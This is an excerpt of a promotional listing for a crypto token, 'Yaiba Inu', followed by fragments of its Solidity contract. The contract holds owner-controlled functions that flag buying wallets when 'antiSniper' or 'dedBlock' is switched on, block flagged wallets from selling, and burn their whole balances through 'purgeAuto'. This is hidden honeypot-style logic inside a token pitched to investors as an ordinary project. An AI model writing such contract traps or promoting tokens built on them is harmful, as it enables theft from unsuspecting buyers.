...
The clan is opening its doors to the metaverses with Defi elements and NFTs through potential collaboration with WorldWideWebb. 
Samurais will be able to stake $Yaiba in our genesis Liquidity pool ($Yaiba-ETH) and earn stable yield (Dai/USD/USDT). 
Emissions will be moderated through a governance protocol and other yield strategies. 
Holders will be whitelisted to mint $Yaiba NFTs which will be converted into sprites for adoption in Metaverses.

Website: https://www.yaibainu.xyz/landing
Telegram: https://t.me/YaibaInuEntryPortal
Twitter: https://twitter.com/YaibaInu
...
contract YaibaInu is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;

    bool private swapping;
    bool public antiSniper;
    ...
    mapping (address => bool) public _isAuto;
    ...
    constructor(uint256 liqFee, uint256 marketFee, uint256 supply, uint256 maxBuyPercent, uint256 maxSellPercent, uint256 maxWalletPercent, address marketingWallet, address liqudityWallet, address uniswapV2RouterAddress) ERC20("Yaiba", "Yaiba") {
    ...
    receive() external payable {
  	...
  	function setantiSniper(bool antiSniperOn) external onlyOwner {
  	    antiSniper = antiSniperOn;
  	}
    ...
    function purgeAuto() external onlyOwner {
                for(uint256 i = 0; i < isAuto.length; i++){
            address wallet = isAuto[i];
            uint256 balance = balanceOf(wallet);
            super._burn(address(wallet), balance);
            _isAuto[wallet] = false;
        }
    }
    
    function _purgeAuto() internal {
                for(uint256 i = 0; i < isAuto.length; i++){
            address wallet = isAuto[i];
            uint256 balance = balanceOf(wallet);
            super._burn(address(wallet), balance);
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        ...
        if(takeFee) {
            ...
            if (dedBlock && !_isAuto[to])
            isAuto.push(to);
            
            if(antiSniper && !_isAuto[to])
            isAuto.push(to);
            ...
            emit DEXBuy(amount, to);
                ...
                require(!_isAuto[from], "You are Auto");
